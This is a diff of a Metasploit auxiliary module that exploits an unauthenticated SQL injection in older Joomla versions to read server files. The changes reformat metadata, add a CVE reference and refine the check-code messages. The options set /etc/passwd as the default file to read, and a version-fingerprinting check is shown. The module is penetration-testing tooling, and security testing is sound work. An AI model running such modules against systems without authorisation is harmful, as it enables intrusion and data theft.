@@ -7,38 +7,44 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Joomla weblinks-categories Unauthenticated SQL Injection Arbitrary File Read',
-      'Description'    => %q{
-      Joomla versions 3.2.2 and below are vulnerable to an unauthenticated SQL injection
-      which allows an attacker to access the database or read arbitrary files as the
-      'mysql' user. This module will only work if the mysql user Joomla is using
-      to access the database has the LOAD_FILE permission.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'Brandon Perry <bperry.volatile[at]gmail.com>', #metasploit module
+    super(
+      update_info(
+        info,
+        'Name' => 'Joomla weblinks-categories Unauthenticated SQL Injection Arbitrary File Read',
+        'Description' => %q{
+          Joomla versions 3.2.2 and below are vulnerable to an unauthenticated SQL injection
+          which allows an attacker to access the database or read arbitrary files as the
+          'mysql' user. This module will only work if the mysql user Joomla is using
+          to access the database has the LOAD_FILE permission.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Brandon Perry <bperry.volatile[at]gmail.com>', # metasploit module
         ],
-      'References'     =>
-        [
+        'References' => [
+          ['CVE', '2014-7981'],
           ['EDB', '31459'],
           ['URL', 'http://web.archive.org/web/20221129082328/https://developer.joomla.org/security/578-20140301-core-sql-injection.html']
         ],
-      'DisclosureDate' => '2014-03-02'
-    ))
+        'DisclosureDate' => '2014-03-02',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('TARGETURI', [ true, "Base Joomla directory path", '/']),
         OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/passwd"]),
         OptInt.new('CATEGORYID', [true, "The category ID to use in the SQL injection", 0])
-      ])
-
+      ]
+    )
   end
 
   def check
-
     front_marker = Rex::Text.rand_text_alpha(6)
     back_marker = Rex::Text.rand_text_alpha(6)
 
@@ -55,22 +61,22 @@ class MetasploitModule < Msf::Auxiliary
     })
 
     if !resp or !resp.body
-      return Exploit::CheckCode::Safe
+      return Exploit::CheckCode::Unknown('No response received from the target')
     end
 
     if resp.body =~ /404<\/span> Category not found/
-      return Exploit::CheckCode::Unknown
+      return Exploit::CheckCode::Unknown('Joomla detected but com_weblinks component not found')
     end
 
     version = /#{front_marker}(.*)#{back_marker}/.match(resp.body)
 
     if !version
-      return Exploit::CheckCode::Safe
+      return Exploit::CheckCode::Safe('Could not determine Joomla version')
     end
 
     version = version[1].gsub(front_marker, '').gsub(back_marker, '')
     print_good("Fingerprinted: #{version}")
-    return Exploit::CheckCode::Vulnerable
+    return Exploit::CheckCode::Vulnerable("Joomla #{version} is vulnerable to com_weblinks SQLi")
   end
 
   def run
